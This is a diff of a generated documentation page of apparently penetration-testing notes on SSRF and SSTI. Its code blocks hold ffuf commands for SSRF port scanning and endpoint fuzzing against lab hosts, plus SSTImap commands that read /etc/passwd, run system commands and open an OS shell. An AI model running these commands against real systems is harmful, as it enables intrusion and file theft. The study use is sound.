@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -2767,11 +2767,11 @@
 <p>Internal portscan by accessing ports on localhost:</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1">seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">10000</span><span class="w"> </span>&gt;<span class="w"> </span>ports.txt
-</span><span id="__span-0-2">ffuf<span class="w"> </span>-w<span class="w"> </span>./ports.txt<span class="w"> </span>-u<span class="w"> </span>http://10.129.201.127/index.php<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;dateserver=http://127.0.0.1:FUZZ/&amp;date=2024-01-01&quot;</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Failed to connect to&quot;</span>
+</span><span id="__span-0-2">ffuf<span class="w"> </span>-w<span class="w"> </span>./ports.txt<span class="w"> </span>-u<span class="w"> </span>http://10.129.201.127/index.php<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/x-www-form-urlencoded"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"dateserver=http://127.0.0.1:FUZZ/&amp;date=2024-01-01"</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Failed to connect to"</span>
 </span></code></pre></div></td></tr></table></div>
 <h4 id="fuzzing-endpoints">Fuzzing Endpoints</h4>
 <p>Accessing restricted endpoints:</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1">ffuf<span class="w"> </span>-w<span class="w"> </span>/opt/SecLists/Discovery/Web-Content/raft-small-words.txt<span class="w"> </span>-u<span class="w"> </span>http://10.129.201.127/index.php<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;dateserver=http://dateserver.htb/FUZZ.php&amp;date=2024-01-01&quot;</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Server at dateserver.htb Port 80&quot;</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1">ffuf<span class="w"> </span>-w<span class="w"> </span>/opt/SecLists/Discovery/Web-Content/raft-small-words.txt<span class="w"> </span>-u<span class="w"> </span>http://10.129.201.127/index.php<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/x-www-form-urlencoded"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"dateserver=http://dateserver.htb/FUZZ.php&amp;date=2024-01-01"</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Server at dateserver.htb Port 80"</span>
 </span></code></pre></div></td></tr></table></div>
 <h4 id="using-gopher">Using Gopher</h4>
 <p>Consider we find an endpoint admin.php through fuzzing which returns a POST form:</p>
@@ -2885,7 +2885,7 @@
 </span><span id="__span-2-3">pip3<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
 </span><span id="__span-2-4">python3<span class="w"> </span>sstimap.py
 </span><span id="__span-2-5">python3<span class="w"> </span>sstimap.py<span class="w"> </span>-u<span class="w"> </span>http://172.17.0.2/index.php?name<span class="o">=</span><span class="nb">test</span><span class="w"> </span><span class="c1"># Provide target URL to identify SSTI</span>
-</span><span id="__span-2-6">python3<span class="w"> </span>sstimap.py<span class="w"> </span>-u<span class="w"> </span>http://172.17.0.2/index.php?name<span class="o">=</span><span class="nb">test</span><span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;/etc/passwd&#39;</span><span class="w"> </span><span class="s1">&#39;./passwd&#39;</span><span class="w"> </span><span class="c1"># Download remote file to local machine</span>
+</span><span id="__span-2-6">python3<span class="w"> </span>sstimap.py<span class="w"> </span>-u<span class="w"> </span>http://172.17.0.2/index.php?name<span class="o">=</span><span class="nb">test</span><span class="w"> </span>-D<span class="w"> </span><span class="s1">'/etc/passwd'</span><span class="w"> </span><span class="s1">'./passwd'</span><span class="w"> </span><span class="c1"># Download remote file to local machine</span>
 </span><span id="__span-2-7">python3<span class="w"> </span>sstimap.py<span class="w"> </span>-u<span class="w"> </span>http://172.17.0.2/index.php?name<span class="o">=</span><span class="nb">test</span><span class="w"> </span>-S<span class="w"> </span>id<span class="w"> </span><span class="c1"># Execute system commands</span>
 </span><span id="__span-2-8">python3<span class="w"> </span>sstimap.py<span class="w"> </span>-u<span class="w"> </span>http://172.17.0.2/index.php?name<span class="o">=</span><span class="nb">test</span><span class="w"> </span>--os-shell<span class="w"> </span><span class="c1"># Obtain interactive shell</span>
 </span></code></pre></div></td></tr></table></div>
@@ -2948,14 +2948,14 @@
 <span class="normal"> 9</span>
 <span class="normal">10</span>
 <span class="normal">11</span>
-<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
-</span><span id="__span-3-2"><span class="k">&lt;xsl:stylesheet</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="w"> </span><span class="na">xmlns:xsl=</span><span class="s">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span><span class="nt">&gt;</span>
-</span><span id="__span-3-3"><span class="w">    </span><span class="k">&lt;xsl:template</span><span class="w"> </span><span class="na">match=</span><span class="s">&quot;/fruits&quot;</span><span class="nt">&gt;</span>
+<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+</span><span id="__span-3-2"><span class="k">&lt;xsl:stylesheet</span><span class="w"> </span><span class="na">version=</span><span class="s">"1.0"</span><span class="w"> </span><span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
+</span><span id="__span-3-3"><span class="w">    </span><span class="k">&lt;xsl:template</span><span class="w"> </span><span class="na">match=</span><span class="s">"/fruits"</span><span class="nt">&gt;</span>
 </span><span id="__span-3-4"><span class="w">        </span>Here<span class="w"> </span>are<span class="w"> </span>all<span class="w"> </span>fruits<span class="w"> </span>of<span class="w"> </span>medium<span class="w"> </span>size<span class="w"> </span>ordered<span class="w"> </span>by<span class="w"> </span>their<span class="w"> </span>color:
-</span><span id="__span-3-5"><span class="w">        </span><span class="k">&lt;xsl:for-each</span><span class="w"> </span><span class="na">select=</span><span class="s">&quot;fruit&quot;</span><span class="nt">&gt;</span>
-</span><span id="__span-3-6"><span class="w">            </span><span class="k">&lt;xsl:sort</span><span class="w"> </span><span class="na">select=</span><span class="s">&quot;color&quot;</span><span class="w"> </span><span class="na">order=</span><span class="s">&quot;descending&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
-</span><span id="__span-3-7"><span class="w">            </span><span class="k">&lt;xsl:if</span><span class="w"> </span><span class="na">test=</span><span class="s">&quot;size = &#39;Medium&#39;&quot;</span><span class="nt">&gt;</span>
-</span><span id="__span-3-8"><span class="w">                </span><span class="k">&lt;xsl:value-of</span><span class="w"> </span><span class="na">select=</span><span class="s">&quot;name&quot;</span><span class="nt">/&gt;</span><span class="w"> </span>(<span class="k">&lt;xsl:value-of</span><span class="w"> </span><span class="na">select=</span><span class="s">&quot;color&quot;</span><span class="nt">/&gt;</span>)
+</span><span id="__span-3-5"><span class="w">        </span><span class="k">&lt;xsl:for-each</span><span class="w"> </span><span class="na">select=</span><span class="s">"fruit"</span><span class="nt">&gt;</span>
+</span><span id="__span-3-6"><span class="w">            </span><span class="k">&lt;xsl:sort</span><span class="w"> </span><span class="na">select=</span><span class="s">"color"</span><span class="w"> </span><span class="na">order=</span><span class="s">"descending"</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-3-7"><span class="w">            </span><span class="k">&lt;xsl:if</span><span class="w"> </span><span class="na">test=</span><span class="s">"size = 'Medium'"</span><span class="nt">&gt;</span>
+</span><span id="__span-3-8"><span class="w">                </span><span class="k">&lt;xsl:value-of</span><span class="w"> </span><span class="na">select=</span><span class="s">"name"</span><span class="nt">/&gt;</span><span class="w"> </span>(<span class="k">&lt;xsl:value-of</span><span class="w"> </span><span class="na">select=</span><span class="s">"color"</span><span class="nt">/&gt;</span>)
 </span><span id="__span-3-9"><span class="w">            </span><span class="k">&lt;/xsl:if&gt;</span>
 </span><span id="__span-3-10"><span class="w">        </span><span class="k">&lt;/xsl:for-each&gt;</span>
 </span><span id="__span-3-11"><span class="w">    </span><span class="k">&lt;/xsl:template&gt;</span>
@@ -3114,7 +3114,7 @@
       <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
